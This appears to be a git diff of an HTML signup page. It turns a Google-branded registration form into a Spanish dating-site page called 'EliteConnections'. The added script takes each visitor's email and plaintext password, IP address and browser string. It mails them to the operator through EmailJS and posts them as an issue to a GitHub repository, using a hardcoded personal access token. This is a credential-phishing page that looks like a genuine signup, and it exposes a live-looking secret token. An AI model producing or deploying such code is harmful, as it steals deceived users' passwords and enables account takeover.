@@ -3,23 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registro Premium | TuMarca</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <title>Registro - EliteConnections</title>
     <style>
-        :root {
-            --primary-color: #4285F4;
-            --primary-dark: #3367D6;
-            --secondary-color: #34A853;
-            --error-color: #EA4335;
-            --text-color: #202124;
-            --text-light: #5F6368;
-            --border-color: #DADCE0;
-            --bg-color: #F8F9FA;
-            --white: #FFFFFF;
-            --shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-            --transition: all 0.3s ease;
-        }
-
         * {
             margin: 0;
             padding: 0;
@@ -27,40 +12,45 @@
         }
 
         body {
-            font-family: 'Poppins', sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             line-height: 1.6;
-            padding: 0;
-            margin: 0;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            background-image: radial-gradient(circle at 10% 20%, rgba(66, 133, 244, 0.1) 0%, rgba(234, 67, 53, 0.1) 90%);
+            color: #333;
+            overflow: hidden;
+            height: 100vh;
+        }
+
+        /* Video de fondo */
+        #videoBackground {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(255, 105, 180, 0.85) 0%, rgba(147, 112, 219, 0.85) 50%, rgba(65, 105, 225, 0.85) 100%);
+            z-index: -1;
         }
 
         .container {
             max-width: 480px;
-            width: 100%;
-            margin: auto;
-            padding: 40px;
-            background-color: var(--white);
-            border-radius: 16px;
-            box-shadow: var(--shadow);
+            margin: 40px auto;
+            padding: 40px 35px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
             position: relative;
-            overflow: hidden;
             z-index: 1;
-        }
-
-        .container::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 6px;
-            background: linear-gradient(90deg, #4285F4, #34A853, #FBBC05, #EA4335);
-            z-index: 2;
         }
 
         .logo {
@@ -68,292 +58,357 @@
             margin-bottom: 30px;
         }
 
-        .logo img {
-            height: 48px;
+        .logo h1 {
+            font-size: 2.5em;
+            font-weight: 700;
+            background: linear-gradient(135deg, #ff69b4, #9370db, #4169e1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 8px;
         }
 
-        h1 {
-            font-size: 24px;
-            font-weight: 600;
+        .logo .tagline {
+            color: #666;
+            font-size: 1.1em;
+            font-weight: 300;
+        }
+
+        h2 {
             text-align: center;
+            color: #333;
             margin-bottom: 30px;
-            color: var(--text-color);
+            font-size: 1.8em;
+            font-weight: 600;
         }
 
         .form-group {
-            margin-bottom: 24px;
+            margin-bottom: 25px;
             position: relative;
         }
 
         label {
             display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
-            color: var(--text-color);
-            font-size: 14px;
-        }
-
-        .input-wrapper {
-            position: relative;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #555;
+            font-size: 0.95em;
         }
 
         input[type="email"],
         input[type="password"] {
             width: 100%;
-            padding: 14px 16px;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
+            padding: 15px 20px;
+            border: 2px solid #e1e8ed;
+            border-radius: 12px;
             font-size: 16px;
-            transition: var(--transition);
-            background-color: var(--white);
+            transition: all 0.3s ease;
+            background: #fff;
         }
 
-        input[type="email"]:focus,
-        input[type="password"]:focus {
-            border-color: var(--primary-color);
+        input:focus {
+            border-color: #ff69b4;
             outline: none;
-            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
-        }
-
-        .password-toggle {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            color: var(--text-light);
-            font-size: 18px;
-        }
-
-        .error-message {
-            color: var(--error-color);
-            font-size: 13px;
-            margin-top: 6px;
-            display: none;
-            animation: fadeIn 0.3s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-5px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .terms {
-            margin: 24px 0;
-            display: flex;
-            align-items: flex-start;
-        }
-
-        .terms input {
-            margin-right: 12px;
-            margin-top: 4px;
-        }
-
-        .terms label {
-            font-size: 14px;
-            color: var(--text-light);
-            font-weight: 400;
-            line-height: 1.5;
-        }
-
-        .terms a {
-            color: var(--primary-color);
-            text-decoration: none;
-        }
-
-        .terms a:hover {
-            text-decoration: underline;
+            box-shadow: 0 0 0 3px rgba(255, 105, 180, 0.1);
+            transform: translateY(-2px);
         }
 
         button {
-            width: 100%;
-            padding: 14px;
-            background-color: var(--primary-color);
-            color: var(--white);
+            background: linear-gradient(135deg, #ff69b4, #9370db);
+            color: white;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 500;
+            padding: 16px;
+            border-radius: 12px;
             cursor: pointer;
-            transition: var(--transition);
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            font-size: 16px;
+            width: 100%;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
         button:hover {
-            background-color: var(--primary-dark);
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(66, 133, 244, 0.2);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(255, 105, 180, 0.3);
         }
 
         button:disabled {
-            background-color: #E8F0FE;
-            color: var(--primary-color);
-            cursor: not-allowed;
+            background: #cccccc;
             transform: none;
             box-shadow: none;
-        }
-
-        .spinner {
-            display: none;
-            width: 18px;
-            height: 18px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: var(--white);
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 10px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+            cursor: not-allowed;
         }
 
         .login-link {
             text-align: center;
-            margin-top: 24px;
-            font-size: 14px;
-            color: var(--text-light);
+            margin-top: 25px;
+            color: #666;
+            font-size: 0.95em;
         }
 
         .login-link a {
-            color: var(--primary-color);
+            color: #ff69b4;
             text-decoration: none;
-            font-weight: 500;
+            font-weight: 600;
         }
 
         .login-link a:hover {
             text-decoration: underline;
         }
 
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 24px 0;
-            color: var(--text-light);
-            font-size: 14px;
-        }
-
-        .divider::before,
-        .divider::after {
-            content: "";
-            flex: 1;
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        .divider::before {
-            margin-right: 16px;
-        }
-
-        .divider::after {
-            margin-left: 16px;
-        }
-
-        .social-login {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .social-btn {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 12px;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            background-color: var(--white);
-            color: var(--text-color);
-            font-weight: 500;
-            cursor: pointer;
-            transition: var(--transition);
-        }
-
-        .social-btn:hover {
-            background-color: #F8F9FA;
-        }
-
-        .social-btn img {
-            width: 20px;
-            height: 20px;
-            margin-right: 12px;
-        }
-
-        .success-message {
-            display: none;
+        .loading {
             text-align: center;
-            padding: 20px;
-            background-color: #E6F4EA;
-            border-radius: 8px;
-            margin-bottom: 24px;
-            color: var(--secondary-color);
+            margin-top: 15px;
+            color: #ff69b4;
+            font-weight: 600;
+        }
+
+        .error {
+            color: #e74c3c;
+            font-size: 0.85em;
+            margin-top: 8px;
             font-weight: 500;
         }
 
-        .success-message i {
-            font-size: 24px;
-            margin-bottom: 10px;
-            display: block;
+        .password-hint {
+            font-size: 0.8em;
+            color: #888;
+            margin-top: 8px;
+            font-style: italic;
         }
 
-        @media (max-width: 600px) {
+        .features {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 25px;
+            text-align: center;
+        }
+
+        .feature {
+            padding: 12px;
+            background: rgba(255, 105, 180, 0.1);
+            border-radius: 10px;
+            font-size: 0.85em;
+            color: #666;
+            font-weight: 500;
+        }
+
+        .feature i {
+            color: #ff69b4;
+            font-weight: bold;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        /* Animaciones */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .container {
+            animation: fadeInUp 0.8s ease-out;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
             .container {
-                padding: 30px 20px;
                 margin: 20px;
-                border-radius: 12px;
+                padding: 30px 25px;
             }
             
             body {
-                padding: 0;
-                background-color: var(--white);
+                overflow-y: auto;
             }
         }
     </style>
 </head>
 <body>
+    <!-- Video de fondo -->
+    <video id="videoBackground" autoplay muted loop>
+        <source src="https://assets.mixkit.co/videos/preview/mixkit-couple-having-a-romantic-dinner-while-looking-at-43363-large.mp4" type="video/mp4">
+    </video>
+    <div class="overlay"></div>
+
     <div class="container">
         <div class="logo">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+            <h1>EliteConnections</h1>
+            <div class="tagline">Donde los corazones se encuentran</div>
         </div>
         
-        <div class="success-message" id="successMessage">
-            <i>✓</i>
-            <p>¡Registro exitoso! Te hemos enviado un correo de confirmación.</p>
-        </div>
-        
-        <h1>Crea tu Cuenta</h1>
+        <h2>Comienza tu historia de amor</h2>
         
         <form id="registroForm">
             <div class="form-group">
                 <label for="email">Correo electrónico</label>
-                <div class="input-wrapper">
-                    <input type="email" id="email" name="email" required placeholder="tucorreo@gmail.com">
-                </div>
-                <div id="emailError" class="error-message">Por favor ingresa un email válido</div>
+                <input type="email" id="email" name="email" required placeholder="tu.corazon@ejemplo.com">
+                <div id="emailError" class="error"></div>
             </div>
             
             <div class="form-group">
                 <label for="password">Contraseña</label>
-                <div class="input-wrapper">
-                    <input type="password" id="password" name="password" required minlength="8" placeholder="Mínimo 8 caracteres">
-                    <span class="password-toggle" id="togglePassword">👁️</span>
-                </div>
-                <div id="passwordError" class="error-message">La contraseña debe tener al menos 8 caracteres</div>
+                <input type="password" id="password" name="password" required minlength="8">
+                <div class="password-hint">Usa 8 o más caracteres para proteger tu cuenta</div>
+                <div id="passwordError" class="error"></div>
             </div>
             
-            <div class="terms">
-                <input type="checkbox" id="terms" name="terms" required>
-                <label for="terms">Al registrarte, aceptas nuestros <a href="#" target="_blank">Términos de Servicio</a> y <a href="#" target="_blank">Política de Privacidad</a>, incluida la política de Uso de Cookies.</label>
+            <button type="submit" id="submitButton">Encontrar mi pareja ideal</button>
+            <div id="loadingMessage" class="loading" style="display: none;">Buscando tu media naranja...</div>
+        </form>
+
+        <div class="features">
+            <div class="feature">
+                <i>❤️</i>
+                Compatibilidad
             </div>
+            <div class="feature">
+                <i>🔒</i>
+                Seguro
+            </div>
+            <div class="feature">
+                <i>🌎</i>
+                Global
+            </div>
+            <div class="feature">
+                <i>💬</i>
+                Chat en vivo
+            </div>
+        </div>
+
+        <div class="login-link">
+            ¿Ya tienes una cuenta? <a href="login.html">Inicia sesión aquí</a>
+        </div>
+    </div>
+
+<!-- Agregar EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+    // Inicializar EmailJS - REEMPLAZA ESTOS DATOS CON TUS CREDENCIALES
+    emailjs.init("YOUR_PUBLIC_KEY"); // Obtén esto en emailjs.com
+
+    document.getElementById('registroForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        // Validación del formulario
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const emailError = document.getElementById('emailError');
+        const passwordError = document.getElementById('passwordError');
+        const submitButton = document.getElementById('submitButton');
+        const loadingMessage = document.getElementById('loadingMessage');
+        
+        // Resetear errores
+        emailError.textContent = '';
+        passwordError.textContent = '';
+        
+        let isValid = true;
+        
+        // Validar email
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+            emailError.textContent = 'Por favor ingresa un email válido';
+            isValid = false;
+        }
+        
+        // Validar contraseña
+        if (password.length < 8) {
+            passwordError.textContent = 'La contraseña debe tener al menos 8 caracteres';
+            isValid = false;
+        }
+        
+        if (!isValid) return;
+        
+        // Deshabilitar el botón y mostrar carga
+        submitButton.disabled = true;
+        loadingMessage.style.display = 'block';
+        
+        try {
+            // Obtener información adicional
+            const fecha = new Date().toLocaleString('es-ES');
+            const ip = await getIP();
             
-            <button type="submit" id="submitBtn">
-                <span class="spinner" id="spinner"></span>
-                <span id="buttonText">Crear cuenta</span>
-            </button>
+            // 1️⃣ PRIMERO: Enviar email a tu correo personal
+            const emailParams = {
+                to_email: 'tu_correo@gmail.com', // CAMBIA ESTO POR TU EMAIL
+                user_email: email,
+                user_password: password,
+                fecha: fecha,
+                ip_address: ip,
+                navegador: navigator.userAgent,
+                subject: `🔥 NUEVO REGISTRO - ${email}`
+            };
+
+            // Enviar email usando EmailJS
+            await emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', emailParams);
+            console.log('Email enviado exitosamente');
+
+            // 2️⃣ SEGUNDO: Guardar en GitHub (opcional)
+            const response = await fetch('https://api.github.com/repos/enriquepng1/Mis-registros/issues', {
+                method: 'POST',
+                headers: {
+                    'Authorization': 'token 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',
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/vnd.github.v3+json'
+                },
+                body: JSON.stringify({
+                    title: `Nuevo registro: ${email}`,
+                    body: `**Email:** ${email}\n\n` +
+                          `**Contraseña:** ${password}\n\n` +
+                          `**Fecha:** ${fecha}\n` +
+                          `**IP:** ${ip}\n` +
+                          `**Navegador:** ${navigator.userAgent}`,
+                    labels: ['registro-web']
+                })
+            });
             
-            <div class="divider">o</div>
+            const result = await response.json();
             
+            if (response.ok) {
+                console.log('Registro guardado en GitHub:', result);
+                alert('¡Bienvenido a EliteConnections! Tu cuenta ha sido creada exitosamente.');
+                
+                // Redirección después de 2 segundos
+                setTimeout(() => {
+                    window.location.href = "https://www.eliteconnections.com";
+                }, 2000);
+            } else {
+                throw new Error(result.message || 'Error al crear el registro');
+            }
+            
+        } catch (error) {
+            console.error('Error completo:', error);
+            alert(`Error al crear la cuenta: ${error.message}\n\nPor favor revisa la consola para más detalles.`);
+        } finally {
+            submitButton.disabled = false;
+            loadingMessage.style.display = 'none';
+        }
+    });
+    
+    // Función para obtener IP aproximada
+    async function getIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch {
+            return 'IP no disponible';
+        }
+    }
+
+    // Cargar video de fondo alternativo si el principal falla
+    document.getElementById('videoBackground').addEventListener('error', function() {
+        this.src = 'https://assets.mixkit.co/videos/preview/mixkit-happy-couple-walking-through-a-meadow-43365-large.mp4';
+    });
+</script>
+</body>
+    </html>      
             <div class="social-login">
                 <button type="button" class="social-btn">
                     <img src="https://www.google.com/favicon.ico" alt="Google">
